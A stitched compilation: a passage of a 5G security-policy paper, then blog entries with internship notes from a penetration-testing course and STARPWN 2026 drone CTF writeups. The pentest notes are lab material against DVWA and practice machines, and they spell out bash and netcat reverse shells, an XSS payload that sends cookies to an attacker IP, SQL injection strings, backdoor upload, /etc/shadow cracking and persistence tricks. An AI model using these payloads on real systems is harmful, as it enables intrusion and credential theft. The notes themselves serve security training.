3.3. Establishing security policies as part of PCC rulesA PCC rule connects an SDF template (a list of service-data filters or an application ID of an application filter) with possible operations on the traffic (policy enforcement). Building on 3GPP’s current actions focused purely on QoS actions, we propose extending and applying these actions for security purposes, summarized in Table 1.
Table 6.3.1 of 3GPP TS 23.503 lists the information contained in a PCC rule, like information name, description, and whether the PCC can modify this information within a Dynamic PCC rule in the SMF. Table 2 shows an excerpt of Table 6.3.1 of TS 23.503.The gray areas in the table show the elements added on top of the original standard. In the “Security” category, there are two Information Elements, which involve the security policies currently present in the user plane but currently only managed locally in the SMF and limited to the Access Network (AN).Our contribution is to make them part of the PCC rule structure:
At the PDU level, the PCF can also control different parameters of the PDU session, including the conditions under which the SMF obtains a new policy from the PDU session (triggers for policy-control requests), and these conditions are very important for defining security use cases, i.e.if these conditions are security triggers (e.g. unexpected events, overload, exceeding thresholds, etc.), the PCC security rule is conveyed from the PCF to the SMF and enforced in the UPF and/or 5G-RAN.
The purpose of PDU-session-related policy information is to provide PCC (Policy and Charging Control) applying to a single monitoring key or the whole PDU session respectively; the PCF can provide PDU-session-related policy info to the SMF together with the PCC rules or separately.
Table 6.4-1 of TS 23.503 contains PDU-session-related policy info.Table 3 shows an excerpt of Table 6.4-1 of TS 23.503, focusing on usage-monitoring-control-related info, where two new monitoring keys are proposed for (D)DoS attack detection. Finally, the PCF should also instruct the SMF which applications to detect. After receiving a report from the SMF, the PCF can make a policy decision and send an updated or new PCC rule to the SMF. If specific security analytics in the network can define an attack, the same process should apply to security (e.g. communication between a bot and a C&C center) or characterizing a security-event profile (e.g. intending to use an invalid port of a specified protocol in communication to break access-control firewall rules).So a security signature can be created like any other application signature, and the corresponding PCC rule applied. 3.4. Security analytics implemented in NWDAF The information the NWDAF provides can significantly contribute to the PCC decision process the PCF executes. However, the analytics info is currently limited to slice-specific network state, like load-level info. That is, it doesn’t need to know the subscribers using the slice, but it works at the network-slice level.
Proposal: extend the load-level info, adding security-context info (e.g. events, attacks, vulnerabilities, etc.).
It requires security functions implemented separately or as part of standardized network functions (e.g. a UPF with embedded firewall capability) to be provided to the NWDAF or an intermediate dedicated security-analytics platform. Standard TS 23.288 [11] provides the possibility of different types of NWDAFs, specialized for different types of analytics, identified by the Analytics ID Information Element. The PCF can use this info via the N23 interface. Some of this info can already provide very useful information for security analytics and further enforcement, as described in the previous sections. Table 7.1-2 of [11] shows the analytics info the NWDAF service provides. We added a column to this table containing security info that could be extracted to other security-analytics functions for further analysis or directly to the PCF framework to apply specific security PCC rules (see Table 4).
Particularly interesting for security analytics is the network data analytics related to abnormal behavior captured by the NWDAF. The PCF can use the Nnwdaf_AnalyticsSubscription_Subscribe service operation to subscribe to network-analytics notifications related to “abnormal behavior,” to predict and detect security issues, trigger new security policies, or update existing security policies for a specific UE or UE group. The subscription includes the Analytics ID (“Abnormal behaviour”), the analytics-report target SUPI, Internal Group ID, and an analytics filter including a list of anomaly IDs and the possible threshold for each. The current list of anomaly IDs is specified in [11], e.g. “unexpected UE location,” “suspected DDoS attack,” “wrong destination address,” etc. Table 6.7.5.3-3 of the standard provides examples of risk-mitigation policies and actions, like “extend service-area restriction,” “release PDU session,” “update packet filters/QoS,” etc. As described in section 2.4 of this document, the challenge is that at the user-plane level, each application’s communication description is limited to that communication’s traffic and data rate, related to volumetric-type attacks (e.g. flooding, overload, DoS, etc.). Changes or anomalies in statistics or predictions, like the periodicity of UE communication, communication duration, or certain traffic characteristics (e.g. abnormal ports, suspicious DNNs, other useful info, etc.), upload/download volume (mean and variance), may indicate a security event or incident. At the user-plane level, the new proposal includes that, besides volume, changes, and anomalies, the NWDAF can collect real security events (facts) directly from the UPF, thanks to user-plane security inspection functions attached to or embedded in it. This security info may be used by active NFs like the PCF to dynamically update PCC rules for a specific UE in a UE group, change the PDU, or even take action at the slice level when needed. 4. Future workBased on the security-enforcement principles this paper proposes, three areas can be further researched:
specific security analytics supported by machine learning algorithms roaming scenarios, including local break out applicability to IoT use cases
5. Conclusion Referenceshttps://www.sciencedirect.com/science/article/pii/S0140366421001262 meeting slides: https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing

entry.title: Internship Notes - Penetration Testing Course
entry.content:
🌐 中文版：繁體中文
Course content: - Web basics- Active/passive information gathering- Common web vulnerabilities- Target machines- DVWA (Damn Vulnerable Web Application)- RF (radio frequency) penetration testing (IoT)- Basic communication protocols- Software-defined radio (SDR)
PT (penetration testing) vs RT (red team exercise) PT: smaller scope, and can’t target social engineering, e.g. a specific web page RT: larger scope, e.g. the whole company
Black box: closest to a real scenarioWhite box: provide as much relevant info to the tester as possibleGray box: a mix of black and white box, providing a self-declaration form and then letting the tester test Penetration testing flow: Information gathering Vulnerability scanning Exploitation White hat: Vulnerability reporting Black hat: Privilege escalation Persistent access Defense evasion (evading those alarms that go off) Data exfiltration (exfiltrating the DB in batches)
IoT attack vectors
Hardware: physical interface Used by developers, often not disabled after shipping; if you can reach the interface you can usually get root directly, and the low level is usually plaintext transmission The device enclosure provides no protection mechanism The low level uses plaintext transmission Glitching: use tiny voltages to disturb the hardware device Side Channel Attack: for an encryption chip, you can measure its voltage, audio, etc., and use these to analyze the encryption method, key, and so on
Firmware: hardcode, enc key, exploit The software/firmware isn’t encrypted Has sensitive data
Software: Android app Radio: cellular, WiFi, cellular networks Unencrypted wireless communication can be sniffed Jamming attacks Replay attacks Fuzzing: needs reverse engineering first before you can fuzz Communication protocol: the most troublesome, needs the OEM to handle
Cloud: API attacks Injection attacks Authentication/authorization mechanisms Logic flaws Web vulnerabilities
Web attack vectorsWeb 1.0
The bulletin-board concept Only static pages
Web 2.0
Readable/writable, multi-function dynamic pages Applications DB (personal data) API Different users get different pages
Web 3.0
Decentralized (data stored distributed)
HTTP
Composed of request/response Since HTTP is stateless, it relies on the cookie mechanism to record user info and time Status codes
Attack targets User identity
Authentication Permission division Sessione.g. HTTP packet formats are all the same
Input/output:
SQL Injection Command Injection Need normalization processing Developers need to set definite characterse.g. filling a number field with Chinese or English
Program logic
Common tools:Information Gathering: split into active and passive
Active information gathering
nmap actively gathers target info: scanning the target host’s ports Nikto, an open-source website vulnerability scanner: built into Kali Dirb brute-force enumerates directories and files under a web page dirb url# check whether the page stores sensitive data# may be able to scan out user paths# if Apache is used as a relay, it can be scanned out
Passive information gathering
Use passive data (IP, name, birthday, etc.) to describe the target
Don’t contact the target directly, to avoid leaving traces
SHODAN
Can scan all IoT devices in the world Hosts Open ports Whether there are known vulnerabilities Can search with these keywords: hostname: search a specified host or domain, e.g. hostname:”google” port: search a specified port or service, e.g. port:”21” country: search a specified country, e.g. country:”CN” city: search a specified city, e.g. city:”Hefei” org: search a specified organization or company, e.g. org:”google” isp: search a specified ISP, e.g. isp:”China Telecom” product: search a specified OS/software/platform, e.g. product:”Apache httpd” version: search a specified software version, e.g. version:”1.6.2” geo: search a specified geographic location, with lat/lon args, e.g. geo:”31.8639, 117.2808” before/after: search data before/after a specified indexing time, format dd-mm-yy, e.g. before:”11-11-15” net: search a specified IP address or subnet, e.g. net:”210.45.240.0/24” References: https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf https://www.itread01.com/content/1546699324.html
Google Hacking
Use Google Search to gather intelligence on the target Use “site:” to search
Filtering packets
Burp Suite How to use: Open Burp Suite in Kali Enabling the proxy means all traffic afterward goes through Burp Open the browser via the proxy ![](https://i.imgur.com/dWxhFur.png) Go to Project Options > MISC > check Enable ![](https://i.imgur.com/vswHeoq.png) Then you can keep using the proxy ![](https://i.imgur.com/HwXBX1w.png) Open the IP or URL in the browser, and the packets get intercepted into the browser ![](https://i.imgur.com/OATh3RT.png)
Brute force Different attack types have different modes Sniper: tests values from the dictionary in alternating order Send the access content to Repeater to confirm the response
Command InjectionBecause user input isn’t filtered, it can cause sensitive-data leakage and other problemsLinux command
Column 1 Column 2
; or & runs the second command regardless of whether the first succeeded
&& won’t run the next command if the first fails
| (pipe) takes the previous command’s output as the next command’s input
|| (double pipe) runs the next command only if the previous fails
DVWA Enter IP to get shell
You can add some Linux commands to the command cat to dump /etc/shadowls -al to view file permissions ls -al | grep shadowlinux/etc/passwd: Linux used to store all accounts/passwords here/etc/shadow: modern Linux separates it out Reverse shellThe victim’s machine connects back to the attacker’s machine (going out is easier than coming in) Bash
Victim: bash -i >& /dev/tcp/ip/port 0>&1 Attacker: nc -nvlp port
Netcat
Victim: nc ip port -e /bin/bash Attacker: nc -nvlp port
john the ripper brute forceSee the Linux /etc/shadow file structurehttps://blog.gtwang.org/linux/linux-etc-shadow-file-format/ xdg-open >> presents the file so you can open it directly
Cracking the Linux root passwordMerge passwd and shadow, writing into crack unshadow passwd shadow > crack Use john to crack the password Cracking the Windows root passwordSAM fileNTLM hashNet-NTLM, where key exchange happens over the network CVE DetailsYou can track vulnerabilitiesWon’t have the code for how to exploit themExploitDBCan track vulnerabilitiesRemote code execution (RCE) vulnerabilities Metasploithttps://ithelp.ithome.com.tw/articles/10224527 msfconsole
Target machine test (192.168.5.107)NET configThe network must use a bridged adapter
First test which ports on the victim machine are openUse nmap to view open portsYou can see what commands are available in bin
LoginUse SQL Injection to log in
Use the victim computer to connect back to the attacker computerYou can use these two:
bash netcat
Gather info on the victim computer whoamiuname -alsb_release -a
Use ExploitDB to look up vulnerabilities
Open an Apache service on the local computer The opened screen looks like this Put the needed files into the Apache folder so the victim computer can later download the data from Apache
Download the exploit file on the victim computer Use pwd to confirm the location points to tmp (since privileges are insufficient, you need a location the current privileges can read/write) Use wget to download from the locally-opened Apache Confirm permissions
File UploadUse weevely to generate backdoor.phpUpload the file back to the DVWA siteUse weevely to connect to the uploaded path weevely http://IP/dvwa/hackable/uploads/backdoor.php pwd(password) Check the host status
The front end blocks non-images First change the malicious file to .jpeg
Upload the file, use Burp Suite to intercept the packet, and change the filename in the packet to php LFI (Local File Inclusion)Local file inclusion vulnerability (LFI) Sensitive files:
/etc/passwd /var/log/auth.log records which users connected to this machine
/var/log/apache2/access.log/error.log which error messages have appeared
../../../ can browse which files it has
%WINDIR%\win.ini Windows config file, you can see config
You can put an absolute path after ?page= to look up data
RFI (Remote File Inclusion)Has an RFI vulnerabilityNeeds these functions enabled:
allow_url_fopen allow_url_include
XSSCross-Site ScriptingThe target is the user side, not the server side Exploitation conditions
The server doesn’t filter user-submitted data strictly enough Use social engineering to get the victim to click and trigger itImpact: Redirect (malware) to a site they shouldn’t be redirected to Steal cookies PhishingTypes: Reflected: returns a script that the user has to click to be affected Stored: the JS code is stored on the server, and triggers whether or not the user clicks
Insert JS code <script>alert("call 911")</script>
<script>alert(document.cookie)</script>
Steal info from the user and send it to the attackerListen on port 80Enter JS code to connect to the attacker’s IP and send back the cookie <script>new image().src="http://ip/output="+document.cookie;</script>
If script is filtered out, you can use mixed case to obfuscate it e.g. <sCripT>new image().src="http://ip/output="+document.cookie;</sCripT>
XSS stored
Target machine test 2 (192.168.0.182) Gather dataUse dirb to gather web data
Use nmap -A to view which ports are open on the hostYou can target/attack samba among them(samba has quite a few holes)
Open msfconsole
Search for samba vulnerabilities
Compile the exploit script
Run the exploit script(and you can connect in and get root)
How to maintain the connection process?The closer to user behavior, the better and harder to detect
Create a new account Brute-force its other account passwords Insert a service (but AD may cut it off) Create a connection back to your own host (but AD may cut it off)
How To Create a Sudo User in Linux?https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart CSRFIntercept the change-password page Copy the packet’s URI Executing the URI changes the passwordShortening the URI makes it more covert XSS + CSRF combo<script>new Image().src="change-password URI"</script>
Reflected: clicking this image changes it Stored: after login, browsing to a specific image with the cookie changes it
SQL Injection (dumping the DB)The server doesn’t filter, so entered SQL syntax is parsed and the result returnedSQL basics:
Select DB Select table Select column Data
Log into the DB mysql -u root -h IPshow DB;use dvwa;show tables;
select Information Schema
Information_schema.schemata: all DBs Information_schema.tables: all tables Information_schema.columns: all columns
Entering 1 produces info for ID 1So you can use select syntax to enter all DBs 1 ' union select 1, schema_name from information_schema.schemata #
1 ' union select 1, table_name from information_schema.tables #
1 ' union select 1, table_name from information_schema.tables where table_name='dvwa'#
Handy resources Payload All The Thingshttps://github.com/swisskyrepo/PayloadsAllTheThings GTFObins: various reverse shellshttps://gtfobins.github.io/ XSS Bypass Filterhttps://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
RF penetration testingInstall basic packages sudo apt-get install gnuradio sudo apt-get install gr-osmosdrsudo apt-get install rtl-sdrrtl_test
Open osmocom_fftosmocom_fft Communication overviewSignals:
Analog signal: a signal produced by changes in amplitude, which can carry information Hertz (Hz): how many oscillations per second
Digital signal: represented as 0 or 1, not used to carry information
Frequency: how many oscillations per second, cycles per secondBandwidth: describes the range of frequencies, also called bandwidth FFT algorithm:
Center Frequency: (f max + f min)/2 Bandwidth (channel width): |f max - f min|
Spectrum allocation: ISM band:
No license or government fee needed 2.4GHz, 868MHz
Sub-1G band:
Bands below 1GHz are called Sub-1GHz
Transmit: modulation -> message × carrier = signalReceive: demodulation
Analog modulation Frequency Modulation (FM): uses signal frequency density to represent Amplitude Modulation (AM): uses signal amplitude level to represent Phase Modulation (PM): uses different phases (angles) to represent
Digital modulation Amplitude-Shift Keying (ASK) Frequency-Shift Keying (FSK) Phase-Shift Keying (PSK) Orthogonal Frequency-Division Multiplexing (OFDM), e.g. WiFi
Comparison
Simplex: receive only, or transmit onlyHalf-duplex: can choose one of receive/transmit at a time, e.g. radioDuplex: can transmit & receive at the same time, e.g. phone Current:current on a conductor - transmitter (Tx) -> air interface -> receiver (Rx) - current on a conductor Wireless IC DongleSDR Platforms Wireless IC Dongle vs SDR Platforms
Wireless IC Dongle: after receiving a signal, sends the demodulated signal to the computer SDR Platforms: after receiving a signal, sends the undemodulated signal to the computer
Gain vs Loss
Gain: output signal > input signal; by conservation of energy, the signal doesn’t grow for no reason, so it’s amplified via current Loss: input signal > output signal; energy-conservation conversion via heat
Decibels are used as the comparison measure Sampling theorem:To convert an analog signal to a digital one via sampling, how many points are needed to represent one wave?
<fs sampling rate, f sampling frequency, B bandwidth>
Low-pass sampling theorem: sampling rate is at least twice the sampling frequency fs = 2 × f Band-pass sampling theorem: sampling rate is at least twice the bandwidth fs = 2 × B
Decimation: lower the sampling rate
Interpolation: raise the sampling rate
Aliasing effect: occurs at the signal’s center frequency ± sampling rate
Matching:
RF signal impedance 50 Ω (Ohm) Video signal impedance 75 Ω (Ohm) Poor matching: RF signal will have reflection issues, and in severe cases may burn out
gnuradio-companion
Each item in the figure is a function module connected togetherNBFM Receive is the receive for demodulating the signal; without it, it won’t work Open a new flow graphFile > New > WX GUIArea introRTL-SDR parameter settingsYou can change the variable so all variables related to samp_rate change together Save all signals received by the RTL to a fileGive file_sink the storage location inspectrum <file>
ComponentsActive: needs power to operatePassive: operates without power
Amplifier:
Three properties: gain, noise figure, linearity Gain: expressed in dB Noise figure: expressed in dB Linearity: degree of distortion
Three types: low-noise, high-power, other
Antenna
Antenna: receives and transmits signals Omnidirectional antenna: all around Directional antenna: only one angle Gain antenna: sacrifices the electromagnetic field; not power gain but directional gain Active antenna: must include power gain
Frequency: determines the antenna’s size Propagation direction: determines the antenna’s shape Omnidirectional: all around Directional: only one angle
Power: determines the antenna’s size
Filter
Divides different signals by “frequency” Frequency response: beyond its frequency, the effect declines Filters out frequencies you don’t want
Mixer:
Changes the signal’s frequency while keeping other characteristics, i.e. doing modulation A mixer is usually followed by a filter Harder to digitize
Oscillator:
Harder to digitize
Component comparison
Component communication
Transmitter
Receiver
Reverse engineeringFlow:
Find the signal Capture the signal Analyze the signal
Analyze the signal: Preamble: tells both sides to get ready to connect Common: 0xaaaa, 0x5555
Sync Word: “I’m about to start transmitting data now!” Common: 0xd391
FFT size: adjusts the frequency-axis scalingZoom: adjusts timePower Max: adjusts signal displayPower Min: adjusts background-noise displayAdjust Zoom & FFT size
Make the red line hug the signal You can see the amplitude below (the green line) urh signal analysisanalysis Analysis exercisesDoorbell exercisefrequency 240~960MHz modulation OOK (On-Off Keying, a kind of ASK) or ASK preamble size 0preamble 0x55 or 0xaa Sync size 32 bitsSync Word 0x80000000 Packet Structure:Sync+(0x8eee8ee88eee888e888888e88)*39+0x8eee8ee88eee888e888888e8 Once you understand the packet structure, the next step is to simulate a similar packet structure and send it back to the IoT device. If the original signal doesn’t filter the needed values, i.e. changing the length or content in the Data part, will the IoT device crash? PWM
high-high-low 1 high-low-low 0 PWM coding is often modulated with ASK bit rate = baud rate / 3 = symbol rate / 3Manchester test high voltage to low voltage is 0 low voltage to high voltage is 1 bit rate = baud rate / 2 = symbol / 2
Unknown exercise Identify Application
remote controlled car application
Identify Modulation Type
ASK/OOK
Identify Preamble
No
Identify Sync Word
4*W2 or W2 both work
Identify Encoding
NRZ (often modulated with ASK, but this case is an exception)
Identify 4 Signal Functions
up: w2x4 + w1x10 down: w2x4 + w1x40 right: w2x4 + w1x64 left: w2x4 + w1x58
Identify Packet Structure
apache2 serverReferencehttps://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apachehttps://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/
installsudo apt updatesudo apt install apache2 start# sudo /etc/init.d/apache2 start restart# sudo /etc/init.d/apache2 restart stop# sudo /etc/init.d/apache2 stop

entry.title: STARPWN 2026 Writeup Index: My First Aerospace CTF
entry.content:
🌐 中文版：繁體中文 This post records the overall experience of competing in STARPWN 2026; I’ll write up the individual challenges separately.It’s more of an overview: what this competition is actually about, which challenges I found interesting, and what it left me with afterward.
What is STARPWN 2026?STARPWN is an aerospace security CTF run by the DEF CON Aerospace Village. Unlike a typical CTF that splits challenges into Web, Pwn, Crypto, Reverse categories, it leans into aerospace-domain scenarios, such as:
MAVLink ArduPilot EEPROM / firmware data GPS and coordinate data PCAP / telemetry Orbital mechanics Image processing
So by the end it felt like a crash course in space systems and drone security on the side.
Competition site: https://starpwn.ctfd.io/
Why did I play this one?My reason for joining STARPWN was actually pretty simple. I’ve been wanting to explore the Space Systems / Space Security direction for a while, but “space security” feels incredibly vague (there don’t seem to be many people working on it in Taiwan), and satellites, ground stations, comms protocols, flight control, navigation, embedded systems, orbital mechanics could each become an entire field on their own. So I wanted to know: if someone actually turned Space Security into a CTF, what kinds of challenges would they write? And after playing, the answer was far more interesting than I’d expected, because it isn’t just ordinary security challenges wearing a satellite skin. At least this time, quite a few challenges genuinely required domain knowledge: you might reverse a binary but not know MAVLink signing; you might write Python but not know the Hohmann transfer; you might read GPS coordinates fine but never have thought to geometrically back out a jammer’s location from a few jammed drones’ positions. From a learning standpoint, I found this competition very worthwhile. A CTF where you study as you goI ran into plenty of things I was completely unfamiliar with: how MAVLink message signing actually works, how ArduPilot stores certain data, how GPS interference can be localized, and those orbital-intercept formulas I’d only ever seen in textbooks or articles. I learned a lot while solving, which is why I wanted to organize it into writeups. About AIThis edition had something very 2026 about it: the organizers allowed using AI / LLMs, but required there still be a human who genuinely understands the challenge behind it. Late in the competition, a few teams were actually disqualified for AI usage that violated the rules (I saw it on the official Discord, which was scary). After that announcement, I reconsidered how I’d used AI this time. For simpler challenges, or ones already within my comfort zone, I was actually much faster than the AI. The first few MISC challenges felt like AI was just burning tokens, so I solved them myself. But for binaries, protocols, or unfamiliar domains, I’d let Claude help analyze, write a parser or solver, and then decide the next step from the results. There were also challenges completely beyond my knowledge, like image processing or certain orbital-mechanics calculations, where I did lean heavily on AI to try different approaches, but if the goal is learning, I learned a lot, which is another reason I wanted to revisit and organize these writeups afterward. Final resultI competed as a solo team named Normal_Team. Final ranking: 18th place. The scoreboard had 339 ranked teams, so roughly the top 5%. I was around 18th midway through, then dropped into the mid-20s due to getting stuck and sleeping; after the competition, the organizers cleaned up some teams that violated the AI policy, and my ranking landed back at 18.
For my first time fully playing an Aerospace CTF like this, I think it’s a pretty fun result. But more important than the ranking: I now at least know what a “Space Security CTF” actually looks like. Writeup indexBelow are the challenges I found more interesting and worth keeping. A note on grouping: these challenges are not one continuous storyline, and each one lists its actual category for reference. Roughly four groups: the first three revolve around the same fictional Prismantir drone swarm, wrapped in a similar story as flavour (scored independently, with no solve-order dependency), all in Forensics / drone telemetry; the next two are interactive-TCP orbital-mechanics calculation challenges, same style but with no story connection to the swarm; then two are the same set of visual-cipher (Forensics) challenges, same setting but different writing systems to crack; and the last is a completely independent Web / Supply Chain challenge, linked to the space/drone theme only by flavour. One to Rule Them All: from one flight-control chip into a whole drone swarmCategory: Forensics / drone telemetry (MAVLink protocol) Find the MAVLink signing key in a drone EEPROM dump.
Hit a classic C struct padding problem along the way, then used the found key to connect into a live drone system.
And the flag’s hiding spot is wonderfully plain: just list the filesystem properly and you’ll see it. Deadly Parade: three drones lose GPS at once, and geometry finds the jammerCategory: Forensics / drone telemetry / geolocation Extract the drones’ telemetry from a PCAP and find the ones simultaneously under GPS interference.
I first used two seemingly reasonable average positions in a row, and both guesses were wrong. Only later did I realize what was really needed was a very basic geometric idea: the circumcenter of a triangle.
This one took the scenic route to the answer. Connect the Dots: a stray drone writing in the sky with its trajectoryCategory: Forensics / drone telemetry Here you get a roughly 150 MB raw MAVLink stream. After unpacking it, you can see ten drones’ individual flight paths. One of them clearly broke off from the formation, and plotting its path alone reveals it wasn’t flying randomly: it’s writing letters in the sky!!
Probably one of my favourite challenges this time.
Time to Intercept: got the formula right, but pasted the old answer wrong four timesCategory: Misc / orbital mechanics (interactive TCP service) Unlike the first three, this one is fully standalone with no Prismantir flavour, just a Hohmann-transfer orbital intercept calculation, needing transfer time, mean motion, and phase angle, then deciding when to depart based on the target satellite’s position. The biggest bug up front was getting the phase-angle direction backwards. After finally fixing it and reconnecting, I reflexively pasted in the old answer from the previous round. My head wasn’t very clear while playing this one, and I kept reconnecting with stale answers, about four times. Tumbling Through Space: a tumbling satellite, with the answer blocked by floating-point errorCategory: Misc / orbital mechanics (interactive TCP service) Same type as Time to Intercept, but here the server practically prints the control law in the hint: T = -L / t. The physics itself isn’t hard.
The real sticking point was floating-point precision. The computed torque vector’s magnitude should be exactly 1.0 in theory, but after rounding it came out slightly over on re-validation, and my first submission got rejected over it.
Strange Holos 1: the graffiti on the wall is an alien scriptCategory: Misc / Forensics (visual cipher) Just one cyberpunk-style image, no hints at all. First rule out that the answer is hidden inside the file, then slice the wall graffiti into individual characters. I first guessed it was the Standard Galactic Alphabet, but grabbing the real mapping table and comparing showed it was completely off. The real answer is Star Wars’ Aurebesh, decoding to one of the most famous lines in the whole saga. Strange Holos 2: this time it’s Klingon, but the match scores are suspiciously lowCategory: Misc / Forensics (visual cipher) The second stage of the same set, with a completely different writing system. Comparing the wall characters against a real font gave scores too low to trust, because the image is AI-generated and only stylistically similar. The real approach is to ask a different question: regardless of which alphabet this is, first look at which characters on the wall look the same as each other. Starry Hacks: supply-chain poisoning a satellite’s ground-control softwareCategory: Web / Supply Chain A completely different type from the rest: you get a leaked flight-control software repo, find the dependency-confusion vulnerability in it, build a malicious package with the same name but a higher version number, and slip it into the normal build process.
In the end it came down to letting the server’s error message exfiltrate data for me: have the malicious code throw an exception, and the flag rides back out with the error message.
ClosingSTARPWN was more like a map for me. It was the first time I concretely saw what the vague term “space security” contains once you break it apart (though it really does feel like nobody’s talking about space security yet, it hasn’t caught on). Some of it was stuff I was already fairly comfortable with, like networking, binary, and protocol, but some I’d barely touched before, like flight control systems, navigation systems, orbital mechanics, and some image processing. For a lot of these challenges I still wouldn’t claim to fully understand them, so organizing these writeups is itself part of the competition for me.
At least next time I see MAVLink, ADCS, orbital transfer, or some weird telemetry dump, I hopefully won’t be starting completely from zero again.

entry.title: From One Captured Flight Controller into a Whole Drone Swarm | One to Rule Them All | STARPWN 2026
entry.content:
🌐 中文版：繁體中文 This is the challenge with the most complete storyline in STARPWN 2026, I think. Technically it’s not especially brutal. It just stitches a hard-looking puzzle together with a few basic but easily-overlooked protocol features, and the final solution is almost comically simple. That said, I stepped in every pothole along the way.
What the challenge is aboutThe backstory reads: Prismantir’s team got hands on an enemy drone last night - the rest of its swarm went dark before anyone else could be brought in. Its flight controller landed on your desk this morning, still warm. One unit is all we get but word is they all share the same secret, so make it count before someone finds out and changes it.
In plain terms: we captured an enemy drone last night, and its whole “swarm” (a group of cooperatively flying drones) went dark and vanished before we could act. The captured drone’s “flight controller” (the drone’s brain, a board with sensors, GPS, and a radio module) is now on your desk, still warm. We have just this one unit, but intel says the whole swarm shares the same secret, so use it to the fullest before they notice and change it.
Three things are given:
Item Description
eeprom.bin (16,384 bytes) A raw memory dump of the captured drone’s flight controller: static, offline, won’t change again
Web UI A ground-station web backend showing a group of still-alive, still-flying drones
MAVLink Telemetry (tcp:host:port) A live connection you can talk to the drones with directly
Before diving in, some background: MAVLink is the most common comms protocol in the drone world, basically the shared language drones and ground stations use to talk. A ground station can ask a drone “how high are you flying, what’s your battery?” and can also command “fly to this coordinate” or “disarm.” Normally this protocol has no encryption and no authentication, so anyone who can connect can eavesdrop or even impersonate the ground station and issue commands. To prevent this, MAVLink 2 added an optional feature called message signing: the ground station and the drone each hold the same 32-byte key, and before each command is sent, a signature is computed from that key plus an incrementing timestamp and appended to the packet; the receiver recomputes the signature and only executes if it matches.
There’s actually a real-world CVE for this: CVE-2026-1579.The vulnerability stems from not enabling MAVLink 2.0 message signing, which after all is not enabled by default.
In other words, whoever has that 32-byte key can pretend to be a legitimate ground station and command the entire swarm. And the core of this challenge is that the key is printed in the captured drone’s memory.
